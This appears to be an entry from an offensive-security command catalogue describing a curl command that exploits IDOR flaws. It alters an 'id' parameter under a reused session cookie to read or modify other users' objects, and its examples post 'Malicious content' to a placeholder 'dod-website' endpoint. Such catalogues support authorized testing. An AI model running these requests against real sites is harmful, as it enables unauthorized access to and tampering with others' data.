---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://target.example.com/edit' -H 'Cookie:
  session=your_session' -d 'id=456&content=modified' -v
tags:
  - web
  - exploitation
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:23.554Z'
verified: false
validated: true
submitted: true
---
# curl-id-parameter-manipulation

## Command

```bash
curl -X POST 'https://target.example.com/edit' -H 'Cookie: session=your_session' -d 'id=456&content=modified' -v
```

## Description

This curl command manipulates an ID parameter in a web request to exploit IDOR vulnerabilities, allowing unauthorized access or modification of objects by altering the 'id' value in POST data while maintaining an authenticated session via cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST for editing operations | Yes |
| `'https://target.example.com/edit'` | The vulnerable endpoint URL | Yes |
| `-H 'Cookie: session=your_session'` | Authenticates the request with a session cookie | Yes |
| `-d 'id=456&content=modified'` | Payload with manipulated ID and modification data | Yes |
| `-v` | Verbose output to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET 'https://dod-website.example.com/view?id=123' -H 'Cookie: session=abc123' -v
```

### Advanced Usage

```bash
curl -X POST 'https://dod-website.example.com/edit' -H 'Cookie: session=abc123' -H 'Content-Type: application/x-www-form-urlencoded' -d 'id=456&title=Unauthorized&body=Malicious content' -v
```

## Expected Output

Successful execution returns HTTP 200 OK with response body confirming the action (e.g., "Update successful"), or the modified content in a GET request. Look for no authorization errors and visible changes in subsequent requests.

## Related

- [[Related Procedure: Exploit-IDOR-for-Unauthorized-Access]]
